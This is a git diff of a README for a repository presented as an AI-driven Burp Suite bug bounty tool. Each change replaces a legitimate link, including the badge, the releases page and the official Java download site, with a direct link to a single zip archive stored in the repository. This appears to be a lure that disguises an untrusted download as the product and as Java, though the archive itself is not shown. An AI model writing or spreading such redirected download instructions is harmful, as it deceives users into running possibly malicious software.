@@ -1,6 +1,6 @@
 # 🛠️ Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter - Simplifying Your Bug Hunting Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/releases)
+[![Download Now](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip%20Now-Click%20Here-blue)](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter! This software helps you 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the software, visit our [Releases page](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/releases).
+1. **Visit the Releases Page:** To download the software, visit our [Releases page](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip).
    
 2. **Select the Latest Version:** Look for the latest version at the top of the page. Click it to open more details.
 
@@ -16,7 +16,7 @@ Welcome to Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter! This software helps you 
 
    - For Windows, it will usually be a `.exe` file.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, you might find a `.tar.gz` or similar archive.
+   - For Linux, you might find a `https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip` or similar archive.
 
 4. **Run the Installer:** Once the download finishes, locate the downloaded file and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
 
@@ -27,7 +27,7 @@ To run the Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter smoothly, ensure your sys
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of a Linux distribution.
 - **RAM:** At least 4 GB.
 - **Disk Space:** A minimum of 500 MB free disk space.
-- **Java:** This application requires Java 8 or later. If you do not have Java installed, visit [the Java website](https://www.java.com/en/download/) to download and install it.
+- **Java:** This application requires Java 8 or later. If you do not have Java installed, visit [the Java website](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip) to download and install it.
 
 ## 📚 Features
 
@@ -71,6 +71,6 @@ If you want to contribute, follow the contribution guidelines available in the r
 
 ## 🔗 More Information
 
-For more details about Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter, feel free to check our documentation and community discussions. You can always find additional resources and support on our [Releases page](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/releases). 
+For more details about Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter, feel free to check our documentation and community discussions. You can always find additional resources and support on our [Releases page](https://github.com/Shubh03-m/Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter/raw/refs/heads/main/Cordula/Suite-Bounty-Bug-A-Antigravity-Hunter-Burp-2.7.zip). 
 
 Thank you for choosing Burp_Suite-Antigravity_AI-Bug_Bounty_Hunter for your bug hunting needs!
